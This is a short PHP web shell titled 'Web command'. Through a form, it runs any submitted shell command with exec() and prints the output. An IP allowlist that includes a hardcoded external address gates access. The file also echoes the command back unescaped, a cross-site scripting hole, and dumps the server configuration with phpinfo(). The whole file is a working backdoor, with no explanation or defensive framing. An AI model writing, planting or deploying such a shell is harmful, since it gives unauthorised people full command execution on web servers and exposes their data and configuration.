<?php
$private_ips = array('127.0.0.1', '::1');
$_SERVER['HTTP_ALLOWED_DEBUG_IPS']="78.234.49.117";
$private_ips = array_merge($private_ips, explode(' ', $_SERVER['HTTP_ALLOWED_DEBUG_IPS']));
if (!in_array(@$_SERVER['REMOTE_ADDR'], $private_ips) && @$_SERVER['SERVER_ADDR'] != '192.168.1.1' && @$_SERVER['SERVER_ADDR'] != '10.8.0.1')
{
        die('You are not allowed to access this file. Check '.basename(__FILE__).' for more information.');
}
set_time_limit(0);
error_reporting(E_ALL^E_NOTICE);
$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
if ($cmd) {
        exec($_POST['cmd']." 2>&1", $output);
}
?>
<html>
        <head>
                <title>Web command</title>
        </head>
        <body>
                <?php if (isset($output)) : ?>
                <pre><?php echo implode('<br />', $output); ?></pre>
                <?php endif; ?>
                <form action="" method="post">
                        <input style="width: 50%" type="" name="cmd" value="<?php echo $cmd; ?>" />
                        <input type="submit" value="Executer">
                </form>
        </body>
</html>
<?php phpinfo(); ?>
